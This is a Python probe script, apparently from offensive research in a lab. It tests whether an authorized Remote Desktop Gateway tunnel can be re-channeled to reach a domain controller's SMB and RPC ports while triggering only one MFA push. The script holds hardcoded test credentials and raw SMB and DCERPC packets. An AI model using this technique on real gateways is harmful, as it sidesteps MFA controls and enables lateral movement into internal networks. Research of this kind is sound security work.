"""Empirical probe: can a live RDG tunnel be re-channeled (second
CHANNEL_CREATE after data flowed on the first)? One tunnel = at most one
MFA push. Stage timestamps let the operator correlate phone pushes."""
import struct
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
import rdetour

GW = "ECORP-RDS.ecorp.local"
TARGET1 = ("192.168.15.40", 445)   # DC SMB
TARGET2 = ("192.168.15.40", 135)   # DC RPC — distinct port to prove re-route


def stamp(msg):
    print("[%6.2fs] %s" % (time.time() - T0, msg), file=sys.stderr, flush=True)


def channel_create(t, host, port):
    name = rdetour.utf16z(host)
    t.send_packet(rdetour.pkt(0x8, b"\x01\x00" + rdetour.u16(port) +
                              rdetour.u16(3) + rdetour.u16(len(name)) + name))
    p = t.recv_packet(timeout=25)
    if p is None:
        return None
    return p


def dump_channel_response(p):
    ptype, body = p
    err, fields = struct.unpack("<IH", body[:6])
    extra = {"channelId": None, "udpPort": None, "authnCookie": None}
    off = 6
    if fields & 0x1:
        extra["channelId"] = struct.unpack("<I", body[off:off + 4])[0]
        off += 4
    if fields & 0x4:
        extra["udpPort"] = struct.unpack("<H", body[off:off + 2])[0]
        off += 2
    if fields & 0x2:
        n = struct.unpack("<H", body[off:off + 2])[0]
        extra["authnCookie"] = body[off + 2:off + 2 + n].hex()
    return err, fields, extra


T0 = time.time()
t = rdetour.RDGTunnel(GW, 443, "ECORP.local", "testuser", "testuser",
                      verbose=False)

stamp("opening OUT leg (HTTP auth here)...")
t.out_tls, out_resp = t._establish_leg("RDG_OUT_DATA")
if (out_resp.header("transfer-encoding", "") or "").lower() == "chunked":
    t.out_tls.buf = out_resp.rest
    t.out_reader = rdetour.ChunkedReader(t.out_tls)
else:
    t.out_tls.buf = out_resp.rest
    t.out_reader = t.out_tls
t._skip_seed()
stamp("OUT leg up")

t.in_tls, _ = t._establish_leg("RDG_IN_DATA")
t.in_tls.send(t._request("RDG_IN_DATA", chunked=True))
stamp("IN leg up")

t._handshake()
stamp("handshake done")
t._tunnel_create()
stamp("tunnel created")
t._tunnel_auth(60)
stamp("tunnel authorized  <-- if a push fired, note the stage above")

# --- channel 1: DC:445 + real data ---
p = channel_create(t, *TARGET1)
stamp("CHANNEL_CREATE #1 -> %s:%d: %s" % (TARGET1 + (repr(p),)))
if p is None or p[0] != 0x9:
    stamp("channel 1 refused/absent — abort")
    t.close()
    sys.exit(1)
err, fields, extra = dump_channel_response(p)
stamp("  resp err=0x%08x fieldsPresent=0x%x %r" % (err, fields, extra))

t.write(rdetour.smb2_negotiate())
r = t.read(timeout=10)
stamp("data on channel 1: %s" % (repr(r[:16]) if r else "NONE"))
if not r or not r.startswith(b"\x00\x00\x00"):
    stamp("no SMB reply — abort")
    t.close()
    sys.exit(1)

# --- channel 2 on the SAME tunnel: DC:135 ---
p = channel_create(t, *TARGET2)
stamp("CHANNEL_CREATE #2 -> %s:%d: %s" % (TARGET2 + (repr(p),)))
if p is None:
    stamp("re-channel: NO RESPONSE (dead end for sticky tunnels)")
    t.close()
    sys.exit(2)
if p[0] != 0x9:
    stamp("re-channel: non-0x9 packet 0x%x body=%s" % (p[0], p[1].hex()))
    t.close()
    sys.exit(2)
err, fields, extra = dump_channel_response(p)
stamp("  resp err=0x%08x fieldsPresent=0x%x %r" % (err, fields, extra))
if err:
    stamp("re-channel denied: %s" % rdetour.hresult_name(err))
    t.close()
    sys.exit(2)

# Prove the data plane now routes to the NEW target (135: send an RPC bind,
# any reply bytes prove routing; also confirms old channel is not replying).
rpc_bind = bytes.fromhex(
    "05000b03100000004800000001000000b810b81000000000"
    "0100000000000001000a0000000000")  # DCERPC bind to EPMapper
t.write(rpc_bind)
r = t.read(timeout=10)
stamp("data after re-channel to :135 -> %s" %
      (repr(r[:24]) if r else "NONE (bind got no reply)"))

# --- channel 3: back to 445, proves repeatability ---
p = channel_create(t, *TARGET1)
stamp("CHANNEL_CREATE #3 -> %s:%d: %s" %
      (TARGET1 + (repr(p) if p is None else "0x%x" % p[0],)))
if p and p[0] == 0x9:
    err3, _, _ = dump_channel_response(p)
    stamp("  resp err=0x%08x — repeatable re-channeling CONFIRMED" % err3)
    t.write(rdetour.smb2_negotiate())
    r = t.read(timeout=10)
    stamp("  SMB via channel 3: %s" %
          (repr(r[:16]) if r else "no reply"))

t.close()
stamp("done")
